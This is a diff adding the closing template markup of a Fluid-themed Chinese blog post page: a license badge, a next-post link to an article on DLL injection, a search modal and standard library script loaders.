+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/24/%5B%E9%80%86%E5%90%91%5D%20dll%E6%B3%A8%E5%85%A5--%E7%AA%81%E7%A0%B4session0%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/" title="[逆向] dll注入--突破session0远程线程注入">
+                        <span class="hidden-mobile">[逆向] dll注入--突破session0远程线程注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
